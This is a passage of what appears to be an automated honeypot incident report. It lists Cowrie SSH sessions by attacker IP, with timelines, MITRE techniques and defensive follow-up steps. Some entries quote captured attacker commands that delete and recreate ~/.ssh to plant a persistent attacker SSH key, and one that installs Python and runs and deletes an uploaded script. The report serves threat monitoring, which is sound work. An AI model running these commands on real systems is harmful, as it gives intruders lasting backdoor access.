| **Last Seen** | 2026-07-03 21:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:32:27` | `cowrie.session.connect` |
| `2026-07-03 21:32:27` | `cowrie.client.version` |
| `2026-07-03 21:32:27` | `cowrie.client.kex` |
| `2026-07-03 21:32:28` | `cowrie.login.success` |
| `2026-07-03 21:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.244.114[.]221` to AbuseIPDB if not already reported
- [ ] Block `125.244.114[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4ad909b86f2

| Field | Detail |
|---|---|
| **Source IP** | `163.7.12[.]183` |
| **First Seen** | 2026-07-03 21:32 |
| **Last Seen** | 2026-07-03 21:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:32:43` | `cowrie.session.connect` |
| `2026-07-03 21:32:43` | `cowrie.client.version` |
| `2026-07-03 21:32:43` | `cowrie.client.kex` |
| `2026-07-03 21:32:44` | `cowrie.login.success` |
| `2026-07-03 21:32:45` | `cowrie.session.params` |
| `2026-07-03 21:32:45` | `cowrie.command.input` |
| `2026-07-03 21:32:45` | `cowrie.command.failed` |
| `2026-07-03 21:32:46` | `cowrie.log.closed` |
| `2026-07-03 21:32:46` | `cowrie.session.params` |
| `2026-07-03 21:32:46` | `cowrie.command.input` |
| `2026-07-03 21:32:47` | `cowrie.session.file_download` |
| `2026-07-03 21:32:47` | `cowrie.log.closed` |
| `2026-07-03 21:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.12[.]183` to AbuseIPDB if not already reported
- [ ] Block `163.7.12[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9887740e173c

| Field | Detail |
|---|---|
| **Source IP** | `163.7.12[.]183` |
| **First Seen** | 2026-07-03 21:32 |
| **Last Seen** | 2026-07-03 21:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:32:47` | `cowrie.session.connect` |
| `2026-07-03 21:32:47` | `cowrie.client.version` |
| `2026-07-03 21:32:47` | `cowrie.client.kex` |
| `2026-07-03 21:32:48` | `cowrie.login.success` |
| `2026-07-03 21:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.12[.]183` to AbuseIPDB if not already reported
- [ ] Block `163.7.12[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39877a30e650

| Field | Detail |
|---|---|
| **Source IP** | `163.7.12[.]183` |
| **First Seen** | 2026-07-03 21:32 |
| **Last Seen** | 2026-07-03 21:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:32:49` | `cowrie.session.connect` |
| `2026-07-03 21:32:49` | `cowrie.client.version` |
| `2026-07-03 21:32:49` | `cowrie.client.kex` |
| `2026-07-03 21:32:50` | `cowrie.login.success` |
| `2026-07-03 21:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.12[.]183` to AbuseIPDB if not already reported
- [ ] Block `163.7.12[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d3591e68304

| Field | Detail |
|---|---|
| **Source IP** | `202.51.214[.]98` |
| **First Seen** | 2026-07-03 21:35 |
| **Last Seen** | 2026-07-03 21:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:35:00` | `cowrie.session.connect` |
| `2026-07-03 21:35:00` | `cowrie.client.version` |
| `2026-07-03 21:35:00` | `cowrie.client.kex` |
| `2026-07-03 21:35:01` | `cowrie.login.success` |
| `2026-07-03 21:35:02` | `cowrie.session.params` |
| `2026-07-03 21:35:02` | `cowrie.command.input` |
| `2026-07-03 21:35:02` | `cowrie.command.failed` |
| `2026-07-03 21:35:02` | `cowrie.log.closed` |
| `2026-07-03 21:35:03` | `cowrie.session.params` |
| `2026-07-03 21:35:03` | `cowrie.command.input` |
| `2026-07-03 21:35:03` | `cowrie.session.file_download` |
| `2026-07-03 21:35:03` | `cowrie.log.closed` |
| `2026-07-03 21:35:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.51.214[.]98` to AbuseIPDB if not already reported
- [ ] Block `202.51.214[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2097e32689e2

| Field | Detail |
|---|---|
| **Source IP** | `202.51.214[.]98` |
| **First Seen** | 2026-07-03 21:35 |
| **Last Seen** | 2026-07-03 21:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:35:04` | `cowrie.session.connect` |
| `2026-07-03 21:35:04` | `cowrie.client.version` |
| `2026-07-03 21:35:04` | `cowrie.client.kex` |
| `2026-07-03 21:35:05` | `cowrie.login.success` |
| `2026-07-03 21:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.51.214[.]98` to AbuseIPDB if not already reported
- [ ] Block `202.51.214[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f1c45db930a

| Field | Detail |
|---|---|
| **Source IP** | `202.51.214[.]98` |
| **First Seen** | 2026-07-03 21:35 |
| **Last Seen** | 2026-07-03 21:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:35:05` | `cowrie.session.connect` |
| `2026-07-03 21:35:05` | `cowrie.client.version` |
| `2026-07-03 21:35:06` | `cowrie.client.kex` |
| `2026-07-03 21:35:07` | `cowrie.login.success` |
| `2026-07-03 21:35:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.51.214[.]98` to AbuseIPDB if not already reported
- [ ] Block `202.51.214[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cab12db69420

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 21:42 |
| **Last Seen** | 2026-07-03 21:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:42:06` | `cowrie.session.connect` |
| `2026-07-03 21:42:07` | `cowrie.client.version` |
| `2026-07-03 21:42:07` | `cowrie.client.kex` |
| `2026-07-03 21:42:13` | `cowrie.login.success` |
| `2026-07-03 21:42:17` | `cowrie.session.params` |
| `2026-07-03 21:42:17` | `cowrie.command.input` |
| `2026-07-03 21:42:18` | `cowrie.log.closed` |
| `2026-07-03 21:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a5a621f693

| Field | Detail |
|---|---|
| **Source IP** | `34.34.173[.]23` |
| **First Seen** | 2026-07-03 21:44 |
| **Last Seen** | 2026-07-03 21:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:44:46` | `cowrie.session.connect` |
| `2026-07-03 21:44:46` | `cowrie.login.success` |
| `2026-07-03 21:44:47` | `cowrie.session.params` |
| `2026-07-03 21:44:47` | `cowrie.command.input` |
| `2026-07-03 21:44:47` | `cowrie.command.input` |
| `2026-07-03 21:44:47` | `cowrie.command.failed` |
| `2026-07-03 21:44:47` | `cowrie.command.input` |
| `2026-07-03 21:44:47` | `cowrie.log.closed` |
| `2026-07-03 21:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.34.173[.]23` to AbuseIPDB if not already reported
- [ ] Block `34.34.173[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce56be823498

| Field | Detail |
|---|---|
| **Source IP** | `34.34.173[.]23` |
| **First Seen** | 2026-07-03 21:44 |
| **Last Seen** | 2026-07-03 21:46 |
| **Session Duration** | 99s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:44:55` | `cowrie.session.connect` |
| `2026-07-03 21:44:55` | `cowrie.login.success` |
| `2026-07-03 21:44:55` | `cowrie.session.params` |
| `2026-07-03 21:44:55` | `cowrie.command.input` |
| `2026-07-03 21:44:55` | `cowrie.command.failed` |
| `2026-07-03 21:46:34` | `cowrie.log.closed` |
| `2026-07-03 21:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.34.173[.]23` to AbuseIPDB if not already reported
- [ ] Block `34.34.173[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-344b19598c50

| Field | Detail |
|---|---|
| **Source IP** | `34.34.173[.]23` |
| **First Seen** | 2026-07-03 21:44 |
| **Last Seen** | 2026-07-03 21:46 |
| **Session Duration** | 97s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:44:57` | `cowrie.session.connect` |
| `2026-07-03 21:44:57` | `cowrie.login.success` |
| `2026-07-03 21:44:57` | `cowrie.session.params` |
| `2026-07-03 21:44:57` | `cowrie.command.input` |
| `2026-07-03 21:46:34` | `cowrie.log.closed` |
| `2026-07-03 21:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.34.173[.]23` to AbuseIPDB if not already reported
- [ ] Block `34.34.173[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-059006f90348

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-03 21:48 |
| **Last Seen** | 2026-07-03 21:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:48:23` | `cowrie.session.connect` |
| `2026-07-03 21:48:23` | `cowrie.client.version` |
| `2026-07-03 21:48:24` | `cowrie.client.kex` |
| `2026-07-03 21:48:25` | `cowrie.login.success` |
| `2026-07-03 21:48:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67dbfe565298

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-03 21:48 |
| **Last Seen** | 2026-07-03 21:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:48:23` | `cowrie.session.connect` |
| `2026-07-03 21:48:23` | `cowrie.client.version` |
| `2026-07-03 21:48:24` | `cowrie.client.kex` |
| `2026-07-03 21:48:25` | `cowrie.login.success` |
| `2026-07-03 21:48:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-288160244f13

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-03 21:48 |
| **Last Seen** | 2026-07-03 21:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:48:32` | `cowrie.session.connect` |
| `2026-07-03 21:48:32` | `cowrie.client.version` |
| `2026-07-03 21:48:32` | `cowrie.client.kex` |
| `2026-07-03 21:48:33` | `cowrie.login.success` |
| `2026-07-03 21:48:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-092863bb9d13

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-03 21:48 |
| **Last Seen** | 2026-07-03 21:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:48:34` | `cowrie.session.connect` |
| `2026-07-03 21:48:34` | `cowrie.client.version` |
| `2026-07-03 21:48:34` | `cowrie.client.kex` |
| `2026-07-03 21:48:35` | `cowrie.login.success` |
| `2026-07-03 21:48:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d44a2bcac2ad

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 21:52 |
| **Last Seen** | 2026-07-03 21:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:52:35` | `cowrie.session.connect` |
| `2026-07-03 21:52:35` | `cowrie.client.version` |
| `2026-07-03 21:52:35` | `cowrie.client.kex` |
| `2026-07-03 21:52:35` | `cowrie.login.success` |
| `2026-07-03 21:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70afc7002b03

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 21:52 |
| **Last Seen** | 2026-07-03 21:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:52:35` | `cowrie.session.connect` |
| `2026-07-03 21:52:35` | `cowrie.client.version` |
| `2026-07-03 21:52:35` | `cowrie.client.kex` |
| `2026-07-03 21:52:35` | `cowrie.login.success` |
| `2026-07-03 21:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f222087433f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 21:52 |
| **Last Seen** | 2026-07-03 21:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:52:40` | `cowrie.session.connect` |
| `2026-07-03 21:52:40` | `cowrie.client.version` |
| `2026-07-03 21:52:40` | `cowrie.client.kex` |
| `2026-07-03 21:52:41` | `cowrie.login.success` |
| `2026-07-03 21:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab38825b0363

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 21:52 |
| **Last Seen** | 2026-07-03 21:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:52:41` | `cowrie.session.connect` |
| `2026-07-03 21:52:41` | `cowrie.client.version` |
| `2026-07-03 21:52:41` | `cowrie.client.kex` |
| `2026-07-03 21:52:41` | `cowrie.login.success` |
| `2026-07-03 21:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d763ee435708

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 21:53 |
| **Last Seen** | 2026-07-03 21:54 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:53:53` | `cowrie.session.connect` |
| `2026-07-03 21:53:55` | `cowrie.client.version` |
| `2026-07-03 21:53:55` | `cowrie.client.kex` |
| `2026-07-03 21:54:01` | `cowrie.login.success` |
| `2026-07-03 21:54:04` | `cowrie.session.params` |
| `2026-07-03 21:54:04` | `cowrie.command.input` |
| `2026-07-03 21:54:05` | `cowrie.log.closed` |
| `2026-07-03 21:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d14917a18215

| Field | Detail |
|---|---|
| **Source IP** | `35.195.32[.]146` |
| **First Seen** | 2026-07-03 21:58 |
| **Last Seen** | 2026-07-03 21:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:58:03` | `cowrie.session.connect` |
| `2026-07-03 21:58:03` | `cowrie.login.success` |
| `2026-07-03 21:58:04` | `cowrie.session.params` |
| `2026-07-03 21:58:04` | `cowrie.command.input` |
| `2026-07-03 21:58:04` | `cowrie.command.input` |
| `2026-07-03 21:58:04` | `cowrie.command.failed` |
| `2026-07-03 21:58:04` | `cowrie.command.input` |
| `2026-07-03 21:58:04` | `cowrie.log.closed` |
| `2026-07-03 21:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.32[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.195.32[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfaddfaba933

| Field | Detail |
|---|---|
| **Source IP** | `35.195.32[.]146` |
| **First Seen** | 2026-07-03 21:58 |
| **Last Seen** | 2026-07-03 21:59 |
| **Session Duration** | 69s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:58:17` | `cowrie.session.connect` |
| `2026-07-03 21:58:17` | `cowrie.login.success` |
| `2026-07-03 21:58:17` | `cowrie.session.params` |
| `2026-07-03 21:58:17` | `cowrie.command.input` |
| `2026-07-03 21:58:17` | `cowrie.command.failed` |
| `2026-07-03 21:59:26` | `cowrie.log.closed` |
| `2026-07-03 21:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.32[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.195.32[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4a809b0d66a

| Field | Detail |
|---|---|
| **Source IP** | `35.195.32[.]146` |
| **First Seen** | 2026-07-03 21:58 |
| **Last Seen** | 2026-07-03 21:59 |
| **Session Duration** | 67s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:58:19` | `cowrie.session.connect` |
| `2026-07-03 21:58:19` | `cowrie.login.success` |
| `2026-07-03 21:58:19` | `cowrie.session.params` |
| `2026-07-03 21:58:19` | `cowrie.command.input` |
| `2026-07-03 21:59:26` | `cowrie.log.closed` |
| `2026-07-03 21:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.32[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.195.32[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5ffca5368af

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-03 22:01 |
| **Last Seen** | 2026-07-03 22:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:01:41` | `cowrie.session.connect` |
| `2026-07-03 22:01:41` | `cowrie.client.version` |
| `2026-07-03 22:01:41` | `cowrie.client.kex` |
| `2026-07-03 22:01:42` | `cowrie.login.success` |
| `2026-07-03 22:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d51ced445d

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-03 22:01 |
| **Last Seen** | 2026-07-03 22:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:01:42` | `cowrie.session.connect` |
| `2026-07-03 22:01:42` | `cowrie.client.version` |
| `2026-07-03 22:01:42` | `cowrie.client.kex` |
| `2026-07-03 22:01:43` | `cowrie.login.success` |
| `2026-07-03 22:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b5ea55605b6

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-03 22:02 |
| **Last Seen** | 2026-07-03 22:04 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 22:02:05` | `cowrie.session.connect` |
| `2026-07-03 22:02:05` | `cowrie.client.version` |
| `2026-07-03 22:02:05` | `cowrie.client.kex` |
| `2026-07-03 22:02:06` | `cowrie.login.success` |
| `2026-07-03 22:02:08` | `cowrie.session.file_upload` |
| `2026-07-03 22:02:09` | `cowrie.session.params` |
| `2026-07-03 22:02:09` | `cowrie.command.input` |
| `2026-07-03 22:02:09` | `cowrie.command.input` |
| `2026-07-03 22:02:09` | `cowrie.command.input` |
| `2026-07-03 22:02:09` | `cowrie.command.failed` |
| `2026-07-03 22:02:10` | `cowrie.log.closed` |
| `2026-07-03 22:02:11` | `cowrie.session.params` |
| `2026-07-03 22:02:11` | `cowrie.command.input` |
| `2026-07-03 22:02:11` | `cowrie.log.closed` |
| `2026-07-03 22:02:12` | `cowrie.session.params` |
| `2026-07-03 22:02:12` | `cowrie.command.input` |
| `2026-07-03 22:02:12` | `cowrie.log.closed` |
| `2026-07-03 22:02:13` | `cowrie.session.params` |
| `2026-07-03 22:02:13` | `cowrie.command.input` |
| `2026-07-03 22:02:13` | `cowrie.command.failed` |
| `2026-07-03 22:02:13` | `cowrie.command.failed` |
| `2026-07-03 22:03:15` | `cowrie.session.params` |
| `2026-07-03 22:03:15` | `cowrie.command.input` |
| `2026-07-03 22:04:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
